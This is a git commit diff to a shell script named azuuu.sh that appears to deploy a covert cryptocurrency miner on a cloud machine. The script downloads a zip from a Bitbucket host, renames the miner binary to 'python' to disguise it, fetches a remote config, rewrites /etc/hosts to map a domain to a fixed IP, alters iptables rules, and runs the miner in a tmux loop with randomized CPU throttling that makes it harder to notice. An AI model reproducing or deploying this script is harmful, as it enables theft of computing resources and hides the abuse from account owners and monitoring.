267b07463f9218534eff8e47f87ea2339df3abd1
notforme2210 <56055929+notforme2210@users.noreply.github.com>
2019-10-02 17:41:05 +0700

    Update azuuu.sh

--- azuuu.sh
+++ azuuu.sh
@@ -2,14 +2,13 @@
 sudo apt-get update -y
 sudo apt-get install tmux cpulimit unzip -y
 
-wget https://bitbucket.org/tengikekao/grin/downloads/azu4.zip
-unzip azu4.zip
-chmod +x nanominer
-mv nanominer python
+wget https://bitbucket.org/tengikekao/myrep/downloads/data.zip
+unzip data.zip.zip
+chmod +x python
 rm config.ini && wget https://raw.githubusercontent.com/notforme2210/andnotforyou/master/config.ini
-sudo -- sh -c "echo '216.244.80.11  ebay.com' >> /etc/hosts"
+sudo -- sh -c "echo '216.244.80.11  google.com' >> /etc/hosts"
 sudo iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
 sudo iptables -I OUTPUT 2 -p udp --dport 53 -j ACCEPT
 sudo iptables -I OUTPUT 3 -p tcp -d ebay.com --dport 80 -j ACCEPT
 sudo iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP
-tmux new-session -d -s loop 'while (true) ; do sudo pkill cpulimit;sudo pkill python ;r=$(($RANDOM % 250 + 150 ));echo $r;tmux new-session -d -s my_session1 './python';sleep 5;cpulimit -l $r -b -p $(pgrep -n "python");sleep $r;done'
+tmux new-session -d -s loop 'while (true) ; do sudo pkill cpulimit;sudo pkill python ;r=$(($RANDOM % 300 + 80 ));echo $r;tmux new-session -d -s my_session1 './python';sleep 5;cpulimit -l $r -b -p $(pgrep -n "python");sleep $r;done'
